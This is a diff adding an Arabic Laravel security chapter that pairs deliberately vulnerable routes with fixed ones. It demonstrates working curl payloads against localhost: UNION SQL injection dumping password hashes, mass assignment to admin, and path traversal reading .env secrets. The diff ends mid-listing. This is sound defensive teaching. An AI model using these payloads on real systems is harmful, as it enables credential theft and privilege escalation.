@@ -25,6 +25,8 @@
 @page ch08:first { @top-center { content: none; } }
 @page ch09 { @top-center { content: "الفصل 9: الهوية بـ Sanctum والصلاحيات بـ Policies"; } }
 @page ch09:first { @top-center { content: none; } }
+@page ch10 { @top-center { content: "الفصل 10: الأمان: أخطر عشر ثغرات (OWASP) في Laravel"; } }
+@page ch10:first { @top-center { content: none; } }
 @page answers { @top-center { content: "حلول التمارين"; } }
 @page answers:first { @top-center { content: none; } }
 </style></head>
@@ -5197,6 +5199,389 @@ Content-Type: application/json
 <p>المستخدمون يدخلون؛ والآن يجب أن يصمد API أمام من يحاولون كسره. الأمان: الحقن، والهجمات عبر المواقع، والأسرار، والترويسات، والاعتماديات، وقائمة OWASP لأكثر ما يسوء.</p>
 </div>
 </section>
+<section class="chapter" style="page: ch10" data-chapter="10" data-code="b3/laravel/security/ar">
+<div class="opener"><span class="opener-num">10</span><p class="chapter-kicker">الفصل 10</p><h1>الأمان: الهجمات والدفاعات</h1><div class="opener-bit"><svg viewBox="0 0 120 140" aria-hidden="true">
+<path d="M32,104 Q20,112 20,122" fill="none" stroke="#1a1a1a" stroke-width="6" stroke-linecap="round"/>
+<path d="M88,104 Q104,96 106,80" fill="none" stroke="#1a1a1a" stroke-width="6" stroke-linecap="round"/><circle cx="106" cy="76" r="7" fill="#e0e0e0" stroke="#1a1a1a" stroke-width="3"/>
+<rect x="34" y="90" width="52" height="40" rx="13" fill="#c8c8c8" stroke="#1a1a1a" stroke-width="3"/>
+<circle cx="60" cy="108" r="7" fill="#8c8c8c" stroke="#1a1a1a" stroke-width="2.5"/>
+<line x1="60" y1="10" x2="60" y2="24" stroke="#1a1a1a" stroke-width="3.5"/>
+<circle cx="60" cy="8" r="6.5" fill="#e0e0e0" stroke="#1a1a1a" stroke-width="3"/>
+<rect x="6" y="46" width="12" height="24" rx="5" fill="#e0e0e0" stroke="#1a1a1a" stroke-width="3"/>
+<rect x="102" y="46" width="12" height="24" rx="5" fill="#e0e0e0" stroke="#1a1a1a" stroke-width="3"/>
+<rect x="14" y="22" width="92" height="72" rx="24" fill="#a3a3a3" stroke="#1a1a1a" stroke-width="3.5"/>
+<rect x="24" y="33" width="72" height="50" rx="16" fill="#f2f2f2"/>
+<ellipse cx="33" cy="70" rx="5" ry="3" fill="#d4d4d4"/><ellipse cx="87" cy="70" rx="5" ry="3" fill="#d4d4d4"/>
+<ellipse cx="46" cy="55" rx="6" ry="7.5" fill="#111111"/><ellipse cx="74" cy="55" rx="6" ry="7.5" fill="#111111"/><circle cx="48" cy="52" r="2.2" fill="#fff"/><circle cx="76" cy="52" r="2.2" fill="#fff"/><path d="M48,68 Q60,78 72,68" fill="none" stroke="#111111" stroke-width="3.5" stroke-linecap="round"/>
+</svg></div></div>
+
+<div class="goals">
+<p class="goals-title">في هذا الفصل ستتعلم أن</p>
+<ul>
+<li>تفكر كمهاجم، مستخدماً قائمة OWASP Top 10 خريطةً</li>
+<li>ترى حقن SQL يسرق تجزئات كلمات المرور، وتجعله مستحيلاً بالربط</li>
+<li>تمنع العملاء من كتابة حقول لا يجوز لهم لمسها</li>
+<li>تُبقي مدخلات المستخدم خارج مسارات الملفات والأماكن الخطرة الأخرى</li>
+<li>تحمي مستخدمي المتصفح بترويسات الأمان وCORS ودفاعات Laravel نفسه</li>
+<li>تتعامل مع الحدود ووضع التصحيح والأسرار والاعتماديات كمحترف</li>
+</ul>
+</div>
+
+<p class="lead">كل API على الإنترنت تتحسسه سكربتات خلال ساعات من ظهوره. وأغلب ما تجربه قديم ومعروف، وأغلب الهجمات الناجحة ما زالت تستخدم الأخطاء القليلة نفسها: مدخل يُعامل كأنه كود، وفحوص ناقصة، وأسرار في المكان الخطأ. ويمنع Laravel كثيراً منها افتراضياً، وهذا يجعل معرفة أين تنتهي حمايته أهم. وهذا الفصل يرتكب الأخطاء عمداً. فلكل هجوم مساران متجاوران، النسخة البديهية تحت <code>/unsafe</code> والنسخة الآمنة، وكل هجوم يُنفذ فعلاً بـ <code>curl</code>.</p>
+
+<div class="bit"><svg viewBox="0 0 120 140" aria-hidden="true">
+<path d="M32,104 Q20,112 20,122" fill="none" stroke="#1a1a1a" stroke-width="6" stroke-linecap="round"/>
+<path d="M88,104 Q100,112 100,122" fill="none" stroke="#1a1a1a" stroke-width="6" stroke-linecap="round"/>
+<rect x="34" y="90" width="52" height="40" rx="13" fill="#c8c8c8" stroke="#1a1a1a" stroke-width="3"/>
+<circle cx="60" cy="108" r="7" fill="#8c8c8c" stroke="#1a1a1a" stroke-width="2.5"/>
+<line x1="60" y1="10" x2="60" y2="24" stroke="#1a1a1a" stroke-width="3.5"/>
+<circle cx="60" cy="8" r="6.5" fill="#e0e0e0" stroke="#1a1a1a" stroke-width="3"/>
+<rect x="6" y="46" width="12" height="24" rx="5" fill="#e0e0e0" stroke="#1a1a1a" stroke-width="3"/>
+<rect x="102" y="46" width="12" height="24" rx="5" fill="#e0e0e0" stroke="#1a1a1a" stroke-width="3"/>
+<rect x="14" y="22" width="92" height="72" rx="24" fill="#a3a3a3" stroke="#1a1a1a" stroke-width="3.5"/>
+<rect x="24" y="33" width="72" height="50" rx="16" fill="#f2f2f2"/>
+<ellipse cx="33" cy="70" rx="5" ry="3" fill="#d4d4d4"/><ellipse cx="87" cy="70" rx="5" ry="3" fill="#d4d4d4"/>
+<circle cx="46" cy="55" r="8.5" fill="#111111"/><circle cx="74" cy="55" r="8.5" fill="#111111"/><circle cx="49" cy="52" r="3" fill="#fff"/><circle cx="77" cy="52" r="3" fill="#fff"/><ellipse cx="60" cy="72" rx="5" ry="6" fill="#111111"/>
+</svg><div class="bubble"><p class="bubble-name">بِت</p><p>أول مرة شغّلت فيها ماسحاً أمنياً على API بنيته، وجد صندوق بحث يقبل SQL. كنت قد استخدمت إدراج المتغيرات في النص لأنه «مجرد بحث». وخلال دقيقة، كان الماسح قد سرد كل جداول قاعدة بياناتي. لم يُسرق شيء، لأنه كان خادم اختبار. وكانت أنفع دقيقة في مسيرتي.</p></div></div>
+
+<h2><span class="sec">10.1</span> <span>التفكير كمهاجم</span></h2>
+
+<p>يقرأ المهاجم API بطريقة مختلفة عن المستخدم: كل مدخل فرصة ليجعل الخادم يفعل ما لم يُقصد له. وقائمة <dfn>OWASP Top 10</dfn>، التي يحفظها مشروع أمان التطبيقات المفتوح العالمي من بيانات اختراقات حقيقية، تسمّي أشيع طرق نجاح ذلك. ونسختها لعام 2025، وأين يعالج هذا الكتاب كلاً منها:</p>
+
+<table>
+<thead><tr><th>الخطر</th><th>باختصار</th><th>أين</th></tr></thead>
+<tbody>
+<tr><td>كسر التحكم في الوصول</td><td>يصل المستخدمون إلى بيانات أو أفعال ليست لهم</td><td>الفصل 9، و10.3</td></tr>
+<tr><td>سوء إعداد الأمان</td><td>إعدادات افتراضية، ومخرجات تصحيح، وترويسات ناقصة</td><td>10.5 و10.6</td></tr>
+<tr><td>إخفاقات سلسلة توريد البرمجيات</td><td>اعتماديات بها ثغرات أو خبيثة</td><td>10.8</td></tr>
+<tr><td>إخفاقات التشفير</td><td>تجزئة ضعيفة، وبلا HTTPS، وأسرار صريحة</td><td>الفصل 9، و10.7</td></tr>
+<tr><td>الحقن</td><td>مدخل يُنفذ بصفة SQL أو أوامر أو HTML</td><td>10.2 و10.5</td></tr>
+<tr><td>التصميم غير الآمن</td><td>العيب في الخطة لا في الكود</td><td>«عادة محترف» في كل فصل</td></tr>
+<tr><td>إخفاقات المصادقة</td><td>كلمات مرور قابلة للتخمين، ومحاولات بلا حد</td><td>الفصل 9</td></tr>
+<tr><td>إخفاقات سلامة البرمجيات أو البيانات</td><td>الثقة في تحديثات أو بيانات لم تُفحص</td><td>10.8</td></tr>
+<tr><td>إخفاقات السجلات والتنبيهات الأمنية</td><td>هجمات لا يلاحظها أحد</td><td>الفصل 14</td></tr>
+<tr><td>سوء التعامل مع الحالات الاستثنائية</td><td>أخطاء تسرّب تفاصيل أو تفشل مفتوحة</td><td>10.6</td></tr>
+</tbody>
+</table>
+
+<p>ومبدآن يسريان في كل ذلك. <strong>لا تثق بأي مدخل أبداً</strong>: كل ما يأتي من العميل (الجسم، والاستعلام، والترويسات، والكوكيز، وأسماء الملفات) قد يكتبه مهاجم. و<strong>الدفاع بالعمق</strong>: كل طبقة تفترض أن ما قبلها قد يفشل.</p>
+
+<h2><span class="sec">10.2</span> <span>الحقن</span></h2>
+
+<p>البحث أدناه يضع المدخل في SQL بإدراج المتغيرات في نصوص PHP. ومع بحث عادي يعمل تماماً، وهذا بالضبط سبب نجاة هذا الخطأ من مراجعة الكود:</p>
+
+<div class="listing" dir="ltr"><div class="listing-title">routes/api.php</div><pre class="code">Route::get(<span class="s">&#x27;unsafe/products&#x27;</span>, <span class="k">function</span> (Request $request) {
+    $q = $request-&gt;query(<span class="s">&#x27;q&#x27;</span>);
+
+    <span class="c line-bidi">// خطر: المدخل يصير جزءاً من نص SQL</span>
+    <span class="k">return</span> DB::select(<span class="s">&quot;SELECT name, price FROM products WHERE name = &#x27;$q&#x27;&quot;</span>);
+});
+
+Route::get(<span class="s">&#x27;products&#x27;</span>, <span class="k">function</span> (Request $request) {
+    $q = $request-&gt;validate([<span class="s">&#x27;q&#x27;</span> =&gt; [<span class="s">&#x27;required&#x27;</span>, <span class="s">&#x27;string&#x27;</span>, <span class="s">&#x27;max:100&#x27;</span>]])[<span class="s">&#x27;q&#x27;</span>];
+
+    <span class="c line-bidi">// المدخل يسافر منفصلاً، بصفة ربط: لا يكون إلا قيمة</span>
+    <span class="c line-bidi">// الاستعلام نفسه بـ Eloquent: Product::where(&#x27;name&#x27;, $q)-&gt;get()</span>
+    <span class="k">return</span> DB::select(<span class="s">&#x27;SELECT name, price FROM products WHERE name = ?&#x27;</span>, [$q]);
+});</pre></div>
+
+<div class="listing" dir="ltr"><div class="listing-title">الطرفية</div><pre class="code"><span class="c line-bidi"># بحث عادي</span>
+<span class="c">$ </span><span class="k">curl -s -G localhost:8000/api/unsafe/products -H &#x27;Accept: application/json&#x27; --data-urlencode &quot;q=عدة الروبوت&quot; | jq -c</span>
+[{&quot;name&quot;:&quot;عدة الروبوت&quot;,&quot;price&quot;:45000}]
+<span class="c line-bidi"># البحث نفسه، وفي المدخل SQL</span>
+<span class="c">$ </span><span class="k">curl -s -G localhost:8000/api/unsafe/products -H &#x27;Accept: application/json&#x27; --data-urlencode &quot;q=x&#x27; UNION SELECT email || &#x27; &#x27; || password, 0 FROM users --&quot; | jq -c &#x27;.[]&#x27;</span>
+{&quot;name&quot;:&quot;sara@example.com $2y$12$Ecameueo1aGGsjtuqrFRVOSgTugX/TKH6EJBRI554JfGsLZHwkiji&quot;,&quot;price&quot;:0}
+{&quot;name&quot;:&quot;omar@example.com $2y$12$YAueROVZ6nLvaOsYAIhhJu3W1QI1OHBej8ZIzB3fm9FlWBcLUfEj.&quot;,&quot;price&quot;:0}
+<span class="c line-bidi"># المدخل نفسه، بصفة ربط</span>
+<span class="c">$ </span><span class="k">curl -s -G localhost:8000/api/products -H &#x27;Accept: application/json&#x27; --data-urlencode &quot;q=x&#x27; UNION SELECT email || &#x27; &#x27; || password, 0 FROM users --&quot; | jq -c</span>
+[]</pre></div>
+
+<p>أغلق مدخل المهاجم علامة الاقتباس، وأضاف <code>UNION</code> تقرأ جدول المستخدمين، وعلّق الباقي بـ <code>--</code>. ولا تستطيع قاعدة البيانات أن تعرف أي جزء من النص جاء من المبرمج وأيه من المهاجم، فنفذته كله، والرد فيه كل بريد وكل تجزئة كلمة مرور. وبقليل من الجهد الإضافي تقرأ الثغرة نفسها أي جدول، أو تغيّر البيانات، أو أسوأ.</p>
+
+<p>والمسار الآمن يرسل المدخل نفسه <dfn>ربطاً</dfn> (binding): نص SQL بـ <code>?</code>، والقيمة، يسافران إلى PostgreSQL منفصلين، فلا تصير القيمة كوداً أبداً. فبحث ببساطة عن منتج بهذا الاسم الغريب، ولم يجد شيئاً. وEloquent وباني الاستعلامات يربطان كل قيمة عنك، فـ <code>Product::where('name', $q)</code> آمنة. ويبقى الخطر حيثما يُلصق نص في SQL:</p>
+<ul>
+<li>دوال <code>Raw</code> (<code>whereRaw</code> و<code>selectRaw</code> و<code>orderByRaw</code> و<code>DB::raw</code>) و<code>DB::select</code> تأخذ نص SQL: أعطها الربط وسيطاً ثانياً، لا متغيرات مُدرجة أبداً.</li>
+<li><strong>أسماء الأعمدة</strong>، كالحقل الذي يُرتب به، لا يمكن أن تكون ربطاً. تحقق منها مقابل قائمة ثابتة بـ <code>Rule::in(['name', 'price'])</code>، كما فعلت طلبات الفصل 4.</li>
+<li>والخطأ نفسه موجود خارج SQL: أوامر الصدفة المبنية من المدخلات (استخدم <code>Process::run</code> بمصفوفة وسائط)، وHTML المبني من المدخلات (القسم 10.5).</li>
+</ul>
+
+<h2><span class="sec">10.3</span> <span>الإسناد الجماعي</span></h2>
+
+<p>التحديث الذي يكتب أي حقول تصل مريح: أضف عموداً، فيدعمه المسار في الحال. ويدعم أيضاً أعمدة لم يقصد أحد كشفها:</p>
+
+<div class="listing" dir="ltr"><div class="listing-title">routes/api.php</div><pre class="code">Route::patch(<span class="s">&#x27;unsafe/users/{user}&#x27;</span>, <span class="k">function</span> (Request $request, User $user) {
+    <span class="c line-bidi">// خطر: كل حقل يرسله العميل يُكتب، والدور معه</span>
+    $user-&gt;forceFill($request-&gt;all())-&gt;save();
+
+    <span class="k">return</span> $user-&gt;only(<span class="s">&#x27;id&#x27;</span>, <span class="s">&#x27;name&#x27;</span>, <span class="s">&#x27;role&#x27;</span>);
+});
+
+Route::patch(<span class="s">&#x27;users/{user}&#x27;</span>, <span class="k">function</span> (Request $request, User $user) {
+    <span class="c line-bidi">// الحقول التي يجوز للزبون تغييرها وحدها؛ والدور مرفوض صراحة</span>
+    $user-&gt;update($request-&gt;validate([
+        <span class="s">&#x27;name&#x27;</span> =&gt; [<span class="s">&#x27;required&#x27;</span>, <span class="s">&#x27;string&#x27;</span>, <span class="s">&#x27;max:100&#x27;</span>],
+        <span class="s">&#x27;role&#x27;</span> =&gt; [<span class="s">&#x27;prohibited&#x27;</span>],
+    ]));
+
+    <span class="k">return</span> $user-&gt;only(<span class="s">&#x27;id&#x27;</span>, <span class="s">&#x27;name&#x27;</span>, <span class="s">&#x27;role&#x27;</span>);
+});</pre></div>
+
+<div class="listing" dir="ltr"><div class="listing-title">الطرفية</div><pre class="code"><span class="c line-bidi"># عمر يغيّر اسمه، ودوره</span>
+<span class="c">$ </span><span class="k">curl -s -X PATCH localhost:8000/api/unsafe/users/2 -H &#x27;Accept: application/json&#x27; -H &#x27;Content-Type: application/json&#x27; -d &#x27;{&quot;name&quot;:&quot;عمر&quot;,&quot;role&quot;:&quot;admin&quot;}&#x27; | jq -c</span>
+{&quot;id&quot;:2,&quot;name&quot;:&quot;عمر&quot;,&quot;role&quot;:&quot;admin&quot;}
+<span class="c line-bidi"># الطلب نفسه، على المسار الآمن</span>
+<span class="c">$ </span><span class="k">curl -s -X PATCH localhost:8000/api/users/2 -H &#x27;Accept: application/json&#x27; -H &#x27;Content-Type: application/json&#x27; -d &#x27;{&quot;name&quot;:&quot;عمر&quot;,&quot;role&quot;:&quot;admin&quot;}&#x27; | jq -c</span>
+{&quot;message&quot;:&quot;The role field is prohibited.&quot;,&quot;errors&quot;:{&quot;role&quot;:[&quot;The role field is prohibited.&quot;]}}</pre></div>
+
+<p>أرسل عمر حقلاً إضافياً واحداً فصار مديراً. هذا هو <dfn>الإسناد الجماعي</dfn> (mass assignment)، وهو صورة من كسر التحكم في الوصول. ولـ Laravel طبقتان ضده، واضطر المسار غير الآمن إلى إطفائهما معاً:</p>
+<ul>
+<li><strong>قائمة الحقول القابلة للملء في النموذج.</strong> يعلن <code>User</code> عن <code>#[Fillable(['name', 'email', 'password'])]</code>، فتتجاهل <code>update()</code> و<code>create()</code> الحقل <code>role</code>. و<code>forceFill()</code> موجودة للكود الموثوق، كالبذور، وتتخطى القائمة. ومع <code>Model::preventSilentlyDiscardingAttributes()</code> من الفصل 6، ترمي محاولة ملء <code>role</code> استثناءً بدل أن تُتجاهل.</li>
+<li><strong>البيانات المُتحقق منها وحدها.</strong> <code>$request-&gt;validate()</code> تعيد الحقول التي لها قواعد وحدها، لا <code>$request-&gt;all()</code> أبداً. وقاعدة <code>prohibited</code> تذهب أبعد فترفض طلباً يرسل <code>role</code> أصلاً، فيعرف العميل أنه غير مسموح بدل أن يتساءل لماذا لم يحدث شيء. وتغيير الدور مسار آخر، للمديرين وحدهم.</li>
+</ul>
+
+<h2><span class="sec">10.4</span> <span>المسارات والأماكن الخطرة الأخرى</span></h2>
+
+<p>تقديم الملفات من مجلد بأسمائها يبدو بريئاً. لكن الاسم مدخل، و<code>..</code> معناها «المجلد الأعلى»:</p>
+
+<pre data-code="shop/routes/api.php" data-from="Route::get('unsafe/files" data-to="^})->where('path', '.*');#2" data-title="routes/api.php"></pre>
+
+<div class="listing" dir="ltr"><div class="listing-title">الطرفية</div><pre class="code"><span class="c line-bidi"># ملف عام</span>
+<span class="c">$ </span><span class="k">curl -s localhost:8000/api/unsafe/files/terms.txt</span>
+شروط البيع: الأسعار تشمل الضريبة؛ والإرجاع خلال 14 يوماً.
+<span class="c line-bidi"># الصعود خارج المجلد</span>
+<span class="c">$ </span><span class="k">curl -s --path-as-is localhost:8000/api/unsafe/files/../../../.env</span>
+APP_KEY=base64:FFPOXw1cq9rBN1/HQe6IkB+bRqYo+L3EIKKia8ZEe4M=
+DB_CONNECTION=pgsql
+DB_HOST=127.0.0.1
+DB_PORT=5432
+DB_DATABASE=shop
+DB_USERNAME=bit
+DB_PASSWORD=secret
+<span class="c line-bidi"># المسار نفسه، على المسار الآمن</span>
+<span class="c">$ </span><span class="k">curl -s --path-as-is localhost:8000/api/files/../../../.env -H &#x27;Accept: application/json&#x27; | jq -c</span>
+{&quot;message&quot;:&quot;Not Found&quot;}</pre></div>
+
+<p>هذا هو <dfn>اجتياز المسار</dfn> (path traversal)، وهنا سلّم ملف <code>.env</code>: مفتاح التطبيق الذي يوقّع الكوكيز ويشفّرها، وكلمة مرور قاعدة البيانات. والمسار الآمن يقرأ عبر <dfn>قرص</dfn> (disk) جذره المجلد؛ وطبقة التخزين في Laravel (Flysystem) ترفض أي مسار يصعد خارج جذره، ويحوّل المسار ذلك الرفض إلى 404. والأفضل ألا يُستخدم نص العميل مساراً أصلاً: احفظ الملفات المرفوعة بـ <code>$file-&gt;store('products')</code>، التي تختار اسماً عشوائياً، واحفظ الاسم الأصلي في قاعدة البيانات، وابحث بالرقم.</p>
+
+<p>والفكرة نفسها تنطبق على كل مكان يصل فيه المدخل إلى شيء قوي:</p>
+<ul>
+<li><strong>العناوين التي يجلبها الخادم</strong> («استورد صورة منتج من هذا العنوان»). يعطي المهاجم <code>http://localhost:5432</code> أو عنوان البيانات الداخلي لمزوّد السحابة، فيجلبه خادمك، من داخل شبكتك، لأجله. هذا هو <dfn>تزوير الطلبات من جهة الخادم</dfn> (SSRF)، التمرين 5.</li>
+<li><strong>إعادات التوجيه</strong> (<code>?next=…</code> بعد الدخول): اسمح بمسارات موقعك وحدها، وإلا أرسل المهاجم المستخدمين إلى نسخة مزيفة منه. و<code>redirect()-&gt;intended()</code> تبقى في موقعك.</li>
+<li><strong>فك التسلسل</strong> لبيانات من العميل بـ <code>unserialize()</code> قد ينشئ كائنات اعتباطية؛ اقبل JSON بدلاً منها.</li>
+</ul>
+
+<aside class="box warn"><p class="box-title"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 3 22 20H2z" fill="none" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/><path d="M12 9v5" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"/><circle cx="12" cy="17" r="1.3" fill="currentColor"/></svg>احذر: التحقق ليس تهريباً</p><p>التحقق من المدخل («الاسم من 1 إلى 100 حرف») وجعله آمناً لوجهة ما (SQL، أو مسار، أو HTML، أو صدفة) مهمتان مختلفتان. فاسم منتج صالح تماماً قد يحتوي علامة اقتباس، أو <code>..</code>، أو <code>&lt;script&gt;</code>. تحقق عند الحافة، واجعل القيم آمنة حيث تُستخدم، بالأداة المصنوعة لتلك الوجهة: الربط، والأقراص، وتهريب Blade.</p></aside>
+
+<h2><span class="sec">10.5</span> <span>حماية مستخدمي المتصفح</span></h2>
+
+<p>كثيراً ما يُستدعى API من موقع، والمتصفح يضيف هجماته الخاصة. ويعالج Laravel كثيراً منها لصفحاته أصلاً:</p>
+<ul>
+<li><dfn>البرمجة عبر المواقع</dfn> (XSS): يُدخل المهاجم سكربته في صفحة يراها آخرون، كمراجعة منتج مثلاً، فيعمل بجلسة الزائر. و<code>{{ }}</code> في Blade تهرّب كل شيء؛ أما <code>{!! !!}</code> فلا، وهي المكان الذي تبحث فيه أثناء المراجعة. ويحمي API نفسه بإعادة JSON بـ <code>Content-Type</code> الصحيح، والواجهة بالتهريب، كما يفعل Vue وReact إلا في <code>v-html</code> و<code>dangerouslySetInnerHTML</code>.</li>
+<li><dfn>تزوير الطلبات عبر المواقع</dfn> (CSRF): يجعل موقع آخر المتصفح يرسل طلباً إلى موقعك، فيرفق المتصفح كوكيزك. ومسارات الويب في Laravel تفحص رمز CSRF في كل نموذج؛ وكوكي الجلسة فيه <code>SameSite=Lax</code>؛ أما الرموز في الترويسة <code>Authorization</code>، كما في الفصل 9، فلا تُرسل تلقائياً أبداً.</li>
+<li><dfn>اختطاف النقرات</dfn> (clickjacking): تُحمَّل صفحتك خفية داخل موقع آخر، ويُخدع المستخدم ليضغط أزرارك.</li>
+</ul>
+
+<p>وتستطيع المتصفحات رفض كثير من هذا إن طلب الخادم منها، عبر <dfn>ترويسات الأمان</dfn>. ولا يضبطها Laravel افتراضياً؛ ووسيط صغير، يُضاف إلى كل استجابة في <code>bootstrap/app.php</code>، يفعل:</p>
+
+<div class="listing" dir="ltr"><div class="listing-title">app/Http/Middleware/SecurityHeaders.php</div><pre class="code">    <span class="k">public</span> <span class="k">function</span> handle(Request $request, Closure $next): Response
+    {
+        $response = $next($request);
+        <span class="c line-bidi">// ترويسات أمان مع كل استجابة؛ وAPI لا يحتاج سكربتات ولا إطارات أصلاً</span>
+        $response-&gt;headers-&gt;add([
+            <span class="s">&#x27;Content-Security-Policy&#x27;</span> =&gt; <span class="s">&quot;default-src &#x27;none&#x27;; frame-ancestors &#x27;none&#x27;&quot;</span>,
+            <span class="s">&#x27;Strict-Transport-Security&#x27;</span> =&gt; <span class="s">&#x27;max-age=31536000; includeSubDomains&#x27;</span>,
+            <span class="s">&#x27;X-Content-Type-Options&#x27;</span> =&gt; <span class="s">&#x27;nosniff&#x27;</span>,
+            <span class="s">&#x27;X-Frame-Options&#x27;</span> =&gt; <span class="s">&#x27;DENY&#x27;</span>,
+            <span class="s">&#x27;Referrer-Policy&#x27;</span> =&gt; <span class="s">&#x27;no-referrer&#x27;</span>,
+        ]);
+
+        <span class="k">return</span> $response;
+    }</pre></div>
+
+<div class="listing" dir="ltr"><div class="listing-title">bootstrap/app.php</div><pre class="code">    -&gt;withMiddleware(<span class="k">function</span> (Middleware $middleware): <span class="k">void</span> {
+        $middleware-&gt;append(SecurityHeaders::<span class="k">class</span>);
+    })</pre></div>
+
+<div class="listing" dir="ltr"><div class="listing-title">الطرفية</div><pre class="code"><span class="c line-bidi"># ترويسات كل استجابة</span>
+<span class="c">$ </span><span class="k">curl -s -I localhost:8000/api/files/terms.txt</span>
+HTTP/1.1 200 OK
+Content-Security-Policy: default-src &#x27;none&#x27;; frame-ancestors &#x27;none&#x27;
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Content-Type-Options: nosniff
+X-Frame-Options: DENY
+Referrer-Policy: no-referrer</pre></div>
+
+<ul>
+<li><code>Content-Security-Policy</code> تسرد من أين يجوز أن تأتي السكربتات والأنماط والصور. وAPI يجيب بـ JSON ولا يحتاج أياً منها، فـ <code>default-src 'none'</code> ترفض كل شيء؛ أما الموقع فيسرد مصادره. وهي أقوى دفاع ضد XSS في الصفحات.</li>
+<li><code>Strict-Transport-Security</code> تخبر المتصفح أن يستخدم HTTPS وحده لهذا الموقع سنة كاملة، فلا يستطيع أحد إنزال زيارة إلى HTTP العادي.</li>
+<li><code>X-Frame-Options</code> و<code>frame-ancestors</code> تمنعان المواقع الأخرى من تأطير موقعك؛ و<code>X-Content-Type-Options: nosniff</code> تمنع المتصفح من تخمين أن ملفاً نصياً سكربت.</li>
+</ul>
+
+<p>و<dfn>CORS</dfn> (مشاركة الموارد عبر الأصول) هو النصف الآخر. افتراضياً، يجوز لسكربت على <code>evil.example</code> أن يرسل طلباً إلى API لكنه لا يجوز له قراءة الجواب. وترويسات CORS تخفف ذلك للأصول التي تسمّيها. ويجيب Laravel عن CORS من <code>config/cors.php</code> (يُنشئه <code>php artisan config:publish cors</code>)، وهو هنا مقصور على موقع المتجر وطريقتين:</p>
+
+<div class="listing" dir="ltr"><div class="listing-title">config/cors.php</div><pre class="code">    <span class="s">&#x27;paths&#x27;</span> =&gt; [<span class="s">&#x27;api/*&#x27;</span>, <span class="s">&#x27;sanctum/csrf-cookie&#x27;</span>],
+
+    <span class="s">&#x27;allowed_methods&#x27;</span> =&gt; [<span class="s">&#x27;GET&#x27;</span>, <span class="s">&#x27;PATCH&#x27;</span>],
+
+    <span class="s">&#x27;allowed_origins&#x27;</span> =&gt; [env(<span class="s">&#x27;ALLOWED_ORIGIN&#x27;</span>)],</pre></div>
+
+<div class="listing" dir="ltr"><div class="listing-title">الطرفية</div><pre class="code"><span class="c line-bidi"># طلب من موقع المتجر</span>
+<span class="c">$ </span><span class="k">curl -s -I localhost:8000/api/files/terms.txt -H &#x27;Origin: https://shop.example&#x27; | grep -iE &#x27;^(HTTP|access-control|vary)&#x27;</span>
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://shop.example
+<span class="c line-bidi"># طلب من موقع آخر</span>
+<span class="c">$ </span><span class="k">curl -s -I localhost:8000/api/files/terms.txt -H &#x27;Origin: https://evil.example&#x27; | grep -iE &#x27;^(HTTP|access-control|vary)&#x27;</span>
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://shop.example</pre></div>
+
+<p>أخذ الطلبان كلاهما <code>Access-Control-Allow-Origin: https://shop.example</code>: فمع أصل مسموح واحد، يسمّيه Laravel دائماً. والمتصفح يقارن تلك القيمة بأصل الصفحة التي أرسلت الطلب؛ ولسكربت <code>evil.example</code> تختلفان، فيخفي المتصفح الرد عنه. ولاحظ ما <em>ليس</em> CORS: لا يوقف <code>curl</code> ولا السكربتات ولا الخوادم، فهي تتجاهله، ولا يمنع الطلب من الوصول إلى خادمك. إنه يحمي متصفحات المستخدمين، لا API؛ والمصادقة والتفويض ما زالا يفعلان ذلك. ولا تسمح لكل الأصول بـ <code>*</code> أبداً في API يستخدم الكوكيز.</p>
+
+<aside class="box quiz"><p class="box-title"><svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="9.5" fill="none" stroke="currentColor" stroke-width="2"/><path d="M9.3 9.3a2.8 2.8 0 1 1 3.9 2.6c-.8.4-1.2 1-1.2 1.9v.6" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"/><circle cx="12" cy="17.3" r="1.3" fill="currentColor"/></svg>اختبر نفسك</p><ol><li>لماذا يوقف الربط حقن SQL بينما يفشل تهريب علامات الاقتباس يدوياً كثيراً؟</li><li>بلا قاعدة <code>prohibited</code>، ماذا كان سيفعل مسار المستخدمين الآمن بحقل <code>role</code> الإضافي؟</li><li>وصل الطلب من <code>evil.example</code> إلى الخادم في مثال CORS. لماذا ليس هذا مشكلة؟</li></ol><p>الإجابات في آخر الفصل، بعد الملخص.</p></aside>
+
+<h2><span class="sec">10.6</span> <span>الحدود والأخطاء</span></h2>
+
+<p>لا يحتاج المهاجم أن يقتحم ليؤذيك؛ يكفي أن يجعل الخادم مشغولاً عن المستخدمين الحقيقيين، فكل مدخل يحتاج حجماً. فكل نص في كل مجموعة قواعد يأخذ <code>max</code>، وكل قائمة حجم صفحة أقصى، والمسارات الغالية محدد معدل (الفصل 3)، وخادم الويب حداً لأجسام الطلبات (<code>post_max_size</code> و<code>upload_max_filesize</code> في PHP، و<code>client_max_body_size</code> في nginx):</p>
+
+<div class="listing" dir="ltr"><div class="listing-title">الطرفية</div><pre class="code"><span class="c line-bidi"># بحث من 200 حرف</span>
+<span class="c">$ </span><span class="k">curl -s -G localhost:8000/api/products -H &#x27;Accept: application/json&#x27; --data-urlencode &quot;q=$(printf &#x27;a%.0s&#x27; $(seq 200))&quot; | jq -c</span>
+{&quot;message&quot;:&quot;The q field must not be greater than 100 characters.&quot;,&quot;errors&quot;:{&quot;q&quot;:[&quot;The q field must not be greater than 100 characters.&quot;]}}
+<span class="c line-bidi"># الخطأ نفسه مع APP_DEBUG=false</span>
+<span class="c">$ </span><span class="k">curl -s localhost:8000/api/boom -H &#x27;Accept: application/json&#x27; | jq -c</span>
+{&quot;message&quot;:&quot;Server Error&quot;}</pre></div>
+
+<p>الطلب الأخير أعلاه أصاب استعلاماً معطوباً، ولم يعرف العميل إلا «Server Error». وذلك لأن <code>APP_DEBUG</code> هي <code>false</code>. وهذا الخطأ نفسه على خادم وضع التصحيح فيه مشغّل:</p>
+
+<div class="listing" dir="ltr"><div class="listing-title">الطرفية</div><pre class="code"><span class="c line-bidi"># خطأ مع APP_DEBUG=true</span>
+<span class="c">$ </span><span class="k">curl -s localhost:8000/api/boom -H &#x27;Accept: application/json&#x27; | jq &#x27;{message, exception, file, line}&#x27;</span>
+{
